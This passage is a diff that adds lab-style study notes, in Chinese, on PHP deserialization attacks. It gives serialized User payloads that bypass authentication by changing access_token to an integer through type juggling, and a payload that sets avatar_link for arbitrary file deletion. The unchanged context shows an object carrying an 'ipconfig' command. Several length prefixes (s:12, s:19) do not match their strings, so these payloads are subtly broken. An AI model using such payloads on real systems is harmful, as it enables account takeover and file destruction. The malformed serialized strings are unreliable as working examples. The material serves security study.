@@ -40,6 +40,26 @@ O:1:"B":1:{s:3:"cmd";s:8:"ipconfig";}
 
 ![image-20260105200547812](images/image-20260105200547812.png)
 
+## 黑盒例子1
+
+```
+O:4:"User":2:{s:8:"username";s:12:"administrator";s:12:"access_token";s:32:"iy8xns0nig6v9begfwcr45rjwukgkkuk";}
+```
+
+```
+O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
+```
+
+在 PHP 序列化数据中，`s` 表示字符串（string），`i` 表示整数（integer）。反序列化漏洞利用时，将属性值从 `s` 改为 `i`，本质上是修改了数据类型而不仅仅是数据内容。当程序使用弱类型比较（`==`）或布尔判断（`if($var)`）时，不同类型的数据可能被自动转换，从而绕过身份验证或权限校验。因此攻击者常将原本的字符串 Token 修改为整数 `1` 或布尔值 `true`，利用 PHP 的类型转换机制实现逻辑绕过。
+
+![image-20260614154431372](images/image-20260614154431372.png)
+
+## 黑盒例子2
+
+```
+O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"fen8rqmopeme2vzbct2wtb21vnzgrc4d";s:11:"avatar_link";s:19:"users/carlos/morale.txt";}  //任意文件删除
+```
+
 ## ctf考题
 
 ### 1
